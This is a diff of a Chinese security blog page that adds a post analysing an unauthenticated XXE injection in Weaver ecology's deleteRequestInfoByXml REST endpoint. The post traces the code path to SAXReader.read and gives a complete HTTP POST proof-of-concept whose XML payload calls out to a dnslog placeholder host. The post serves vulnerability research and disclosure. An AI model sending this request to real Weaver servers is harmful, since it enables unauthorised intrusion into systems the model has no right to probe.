@@ -77,6 +77,75 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-泛微deleteRequestInfoByXml接口xml注入漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2025-03-12T12:04:35.000Z" itemprop="datePublished">2025-03-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">泛微deleteRequestInfoByXml接口xml注入漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>&#x2F;rest&#x2F;ofs&#x2F;deleteRequestInfoByXml</strong> </p>
+<p><strong>发现泛微很多xxe的地方都会出现xmltomap，这跟到后面会调用SAXReader.read()造成xxe注入漏洞</strong> </p>
+<ul>
+<li>直接跟现有xmltomap存在漏洞的类，观察哪个函数调用了他，然后再往上找接口</li>
+<li>更sink一点，全局搜索SAXReader()实例化的地方，看看是否调用了.read()函数，以及是否有加一些防护手段。</li>
+</ul>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java"><a href="#classbean-weaver-rest-servlet-service-ofs-ProcessDoneRequestByXml-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java"></a>classbean&#x2F;weaver&#x2F;rest&#x2F;servlet&#x2F;service&#x2F;ofs&#x2F;ProcessDoneRequestByXml.java</h2><img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756083401-293a0c52-cec2-46bc-9657-18945fdc2fb3.png" class=""> 
+
+<p>该接口调用了</p>
+<p>OfsTodoDataManagerNew.processDoneRequestByXml方法</p>
+<h2 id="classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java"><a href="#classbean-weaver-ofs-manager-OfsTodoDataManagerNew-java" class="headerlink" title="classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java"></a>classbean&#x2F;weaver&#x2F;ofs&#x2F;manager&#x2F;OfsTodoDataManagerNew.java</h2><h3 id="processDoneRequestByXml"><a href="#processDoneRequestByXml" class="headerlink" title="processDoneRequestByXml"></a>processDoneRequestByXml</h3><img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756128087-a9a9a20c-8ec5-456d-a045-47f49c82a58f.png" class=""> 
+
+<p>该方法会将xml格式文件转为map调用xmltomap函数 </p>
+<h3 id="xmlToMap"><a href="#xmlToMap" class="headerlink" title="xmlToMap"></a>xmlToMap</h3><img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756175124-69285341-d1e8-421b-96a5-5e3746ff7923.png" class=""> 
+
+<p>该函数会将传入的参数进行parseText解析 </p>
+<img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1740756212187-37077b5f-604d-4413-891c-6407dac5eb91.png" class=""> 
+
+<p><strong>重点是SAXReader这个类</strong>，初始化之后read即可造成xml注入漏洞</p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>本地搭建的泛微ecology</p>
+<img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200843035.png" class="" title="image-20250312200843035"> 
+
+<p>且是没有登录状态</p>
+ <img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312200952922.png" class="" title="image-20250312200952922"> 
+
+<p>数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/ofs/deleteRequestInfoByXml HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE syscode SYSTEM &quot;http://xxx.dnslog.cn&quot;&gt;</span><br><span class="line">&lt;M&gt;&lt;syscode&gt;&amp;send;&lt;/syscode&gt;&lt;/M&gt;</span><br></pre></td></tr></table></figure>
+
+<p>dnslog结果</p>
+<img src="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/image-20250312201055988.png" class="" title="image-20250312201055988"> 
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://ro0ki1.github.io/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cm85vputj00033x9k2x0d1mwb" data-title="泛微deleteRequestInfoByXml接口xml注入漏洞" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Fastjson-jndi" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/03/12/Fastjson-jndi/" class="article-date">
@@ -223,7 +292,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://ro0ki1.github.io/2025/03/12/Fastjson-jndi/" data-id="cm85v0eej0000xi9k8edo6dnd" data-title="Fastjson_jndi" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://ro0ki1.github.io/2025/03/12/Fastjson-jndi/" data-id="cm85vputg00003x9kevqm3yks" data-title="Fastjson_jndi" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -382,7 +451,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://ro0ki1.github.io/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cm85v0eel0001xi9kcvk9fxwt" data-title="Log4j漏洞分析" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://ro0ki1.github.io/2025/03/11/Log4j%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="cm85vputh00013x9k1cuj2gnm" data-title="Log4j漏洞分析" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -433,7 +502,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://ro0ki1.github.io/2025/03/11/hello-world/" data-id="cm85v0eel0002xi9k7rs44o46" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://ro0ki1.github.io/2025/03/11/hello-world/" data-id="cm85vputi00023x9k142xd50w" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -474,6 +543,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/03/12/%E6%B3%9B%E5%BE%AEdeleteRequestInfoByXml%E6%8E%A5%E5%8F%A3xml%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">泛微deleteRequestInfoByXml接口xml注入漏洞</a>
+          </li>
         
           <li>
             <a href="/2025/03/12/Fastjson-jndi/">Fastjson_jndi</a>
